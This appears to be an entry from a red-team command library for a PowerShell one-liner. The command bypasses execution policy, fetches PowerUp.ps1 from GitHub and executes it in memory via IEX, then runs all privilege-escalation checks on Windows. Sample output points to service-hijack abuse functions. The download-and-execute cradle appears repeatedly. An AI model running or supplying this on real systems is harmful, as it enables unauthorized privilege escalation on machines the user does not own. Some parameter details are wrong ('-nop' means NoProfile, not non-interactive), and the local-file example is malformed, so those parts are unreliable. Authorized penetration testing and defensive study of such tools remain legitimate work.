---
id: 1baba626-5b38-4914-9da0-a49f3888f8f2
name: powershell-invoke-powerup-allchecks
type: command
executor: powershell
data: >-
  powershell.exe -nop -exec bypass "IEX (New-Object
  Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');
  Invoke-AllChecks"
output: null
created_at: '2023-04-06T03:56:29.682727+00:00'
updated_at: '2023-04-10T20:37:34.119569+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - recon
verified: true
validated: true
---

# powershell-invoke-powerup-allchecks

## Command

```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

## Description

This command downloads the PowerUp.ps1 script from its official GitHub repository and executes all built-in privilege escalation checks on a Windows system. It identifies common misconfigurations, including unquoted service paths, weak service permissions, and DLL hijacking opportunities, outputting potential abuse vectors for manual exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -nop | Non-interactive PowerShell mode | Yes |
| -exec bypass | Bypasses execution policy restrictions | Yes |
| URL in DownloadString | Source URL for PowerUp.ps1 (default: GitHub) | Yes |
| Invoke-AllChecks | Runs all PowerUp checks | Yes |

## Examples

### Basic Usage

```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

### Local File Usage (No Internet)

```powershell
powershell.exe -exec bypass -File PowerUp.ps1; Invoke-AllChecks
```

## Expected Output

The command produces verbose output with sections like:

[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>

Success is indicated by listed vulnerable services with abuse functions.

## Related

- [[procedures/Windows-Privilege-Escalation-Unquoted-Service-Paths]]
- [[commands/powershell-invoke-serviceabuse]]
